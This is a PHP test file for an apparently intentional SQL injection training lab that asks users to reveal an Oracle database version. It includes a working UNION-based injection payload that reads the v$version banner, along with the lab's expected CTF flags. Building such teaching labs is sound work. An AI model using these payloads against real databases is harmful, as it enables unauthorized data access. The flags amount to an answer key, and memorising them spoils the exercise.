<?php

use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;

uses(RefreshDatabase::class);

beforeEach(function () {
    DB::table('oracle_lab_products')->insert([
        [
            'name' => 'Oracle Gift Card',
            'description' => 'Visible product.',
            'category' => 'Gifts',
            'released' => true,
            'created_at' => now(),
            'updated_at' => now(),
        ],
    ]);

    DB::table('v$version')->insert([
        'banner' => 'Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production',
    ]);
});

test('the regular Oracle category filter displays products without solving the lab', function () {
    $this->get(route('labs.sql-injection-oracle-version', ['category' => 'Gifts']))
        ->assertOk()
        ->assertSee('Oracle Gift Card')
        ->assertDontSee('Oracle Database 19c Enterprise Edition')
        ->assertDontSee('data-test="lab-solved"', false);
});

test('a UNION attack can display the Oracle database version and solve the lab', function () {
    $payload = "Gifts' UNION SELECT banner, NULL FROM v$version -- ";

    $this->get(route('labs.sql-injection-oracle-version', ['category' => $payload]))
        ->assertOk()
        ->assertSee('Oracle Database 19c Enterprise Edition')
        ->assertSee('data-test="lab-solved"', false)
        ->assertSee('data-test="ctf-flag"', false)
        ->assertSee('flag{8000_oracle_database_version}');
});

test('the Oracle version flag changes when the lab is served from another configured port', function () {
    $payload = "Gifts' UNION SELECT banner, NULL FROM v$version -- ";

    $this->get('http://nullpointer.test:9001/labs/sql-injection-oracle-version?category='.urlencode($payload))
        ->assertOk()
        ->assertSee('flag{9001_oracle_database_version}')
        ->assertDontSee('flag{8000_oracle_database_version}');
});

test('an invalid Oracle injection is handled without exposing a database error', function () {
    $this->get(route('labs.sql-injection-oracle-version', ['category' => "Gifts'"]))
        ->assertOk()
        ->assertSee('Фільтр категорій сформував некоректний SQL-запит.')
        ->assertDontSee('SQLSTATE');
});
